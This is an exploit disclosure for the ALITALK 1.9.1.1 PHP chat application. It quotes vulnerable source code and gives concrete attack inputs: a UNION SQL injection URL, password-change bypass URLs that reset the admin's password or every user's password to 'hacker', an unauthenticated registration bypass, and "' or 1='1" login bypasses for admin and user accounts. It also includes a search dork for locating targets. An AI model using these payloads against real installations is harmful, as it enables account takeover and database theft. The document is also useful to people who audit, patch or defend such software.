ALITALK 1.9.1.1 Multiple Remote Vulnerabilities
===============================================



######################################################################
# ALITALK v 1.9.1.1 Multiple Vulnerabilities                         #
# author      : tomplixsee                                           #
# google dork : POWERED BY ALITALK                                   #
# download    : http://www.alilg.com/software/free-php-ajax-chat/    #                             
######################################################################

#################
# SQL INJECTION # 
#################
# you need to login in order to exploit this vulnerability
# vulnerable code on inc/receivertwo.php
# <?
# .....
# if($_GET[&#039;turnadd&#039;]==1)
# {
# $rmusr=0;
# while ($rmuiz=mysql_fetch_array($rmmzyiz))
# {
# echo"<rmusj>";
# echo" r%#dtr onmouseout=\"detailsclo()\" onmouseover=\"details(event,&#039;".$rmuiz[gender]."&#039;,&#039;".$rmuiz[age]."&#039;,&#039;".$rmuiz[username]."&#039;,&#039;".$rmuiz[location]."&#039;)\" ondblclick=\"ums(&#039;".$rmuiz[uid]."&#039;,&#039;".$rmuiz[username]."&#039;,&#039;".""."&#039;)\" b*%d
# r%#dtd width=&#039;19&#039;b*%d r%#dimg src=\"pix/room_user.gif\"b*%dr%#d/tdb*%d
# r%#dtd class=&#039;roomuser&#039;b*%dr%#dfont unselectable=&#039;on&#039; style=\"cursor: default;\"b*%d $rmuiz[username] r%#d/tdb*%d
# r%#d/trb*%d";
# $rmusr++;
# echo"</rmusj>";
# }
# ....
# ?>
#
# example:
# http://target/path/alitalk/inc/receivertwo.php?uid=1&mohit=y&#039;+union+select+user(),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2+from+alitalk_users+where+uid=&#039;1&turnadd=1&melody=0&lilil=400


###########################
# PASSWORD CHANGE BYPASS  #
###########################
# vulnerable code on functionz/usercp.php
# <?
# .....
# function newpass($db,$id)
# {
# $nat=md5($_GET[&#039;old&#039;].$_GET[&#039;old&#039;]);
# $nao=md5($_GET[&#039;new&#039;].$_GET[&#039;new&#039;]);
# $threeyiz=mysql_query("SELECT * from ".$db."users where uid=&#039;".$id."&#039; and password=&#039;".md5(md5($_GET[&#039;old&#039;]).$nat)."&#039;");
# $yiz=mysql_fetch_array($threeyiz);
# if(!$yiz)
# {
# echo "Old Password is Wrong!";
# }
# else
# {
# mysql_query("UPDATE ".$db."users SET password=&#039;".md5(md5($_GET[&#039;new&#039;]).$nao)."&#039; WHERE uid=&#039;".$id."&#039;");
# mysql_query("UPDATE ".$db."users SET salt=&#039;".$nao."&#039; WHERE uid=&#039;".$id."&#039;");
# mpl($db,$id);
# }
# }
# .....
# ?>
# examples:
# http://target/path/inc/usercp.php?action=newpass&id=1&#039; or password=&#039;&lilil=400&new=hacker
# this will change password to "hacker" for user with uid = 1 (admin).
# 
# http://target/path/inc/usercp.php?action=newpass&id=1&#039; or 1=&#039;1&lilil=400&new=hacker
# this will change ALL passwords to "hacker".


############################
# USER REGISTRATION BYPASS #
############################
# vulnerable code on inc/elementz.php:
# <?
# ......
# if($_GET[&#039;lilil&#039;]!=="".$_SESSION[&#039;lilol&#039;].""){return false;}
# include"setting.php";
# $analuzeed=mysql_fetch_array($analuze);
# if($analuzeed)
# {
# echo "Fatal Error";
# }
# else
# {
# $nat=md5($_GET[&#039;pa&#039;].$_GET[&#039;pa&#039;]);
# $pass=md5(md5($_GET[&#039;pa&#039;]).$nat);
# ....
# ?>
# example:
# http://target/path/inc/elementz.php?lilil=400&ubild=hacker&pa=hacker
# this will add an account with username=hacker and password=hacker


#############################
# ADMIN LOGIN SQL INJECTION #
#############################
# code on admin/index.php
# <?
# .......
# else if($_POST[&#039;signin&#039;])
# {
# include "../functionz/first_process.php";
# include "../inc/setting.php";
# }
# .....
# ?>
# 
# vulnerable code on functionz/first_process.php
# <?
# ......
# function addin($lamerz,$killer,$josh)
# {
# session_start();
# $nat=md5($killer.$killer);
# $analuze=mysql_query("SELECT * FROM ".$josh."info WHERE admin=&#039;".$lamerz."&#039; AND password=&#039;".md5(md5($killer).$nat)."&#039;");
# $analuzeed=mysql_fetch_array($analuze);
# if($analuzeed)
# {
# $_SESSION[&#039;adazsar&#039;]=1;
# ......
# ?>
#
# admin login page= http://target/path/admin
# example:
#  admin ID = adminusername&#039; or 1=&#039;1
#  password = whatever


############################
# USER LOGIN SQL INJECTION #
############################
#
# example:
#  ID = an_userID&#039; or 1=&#039;1
#  password = whatever



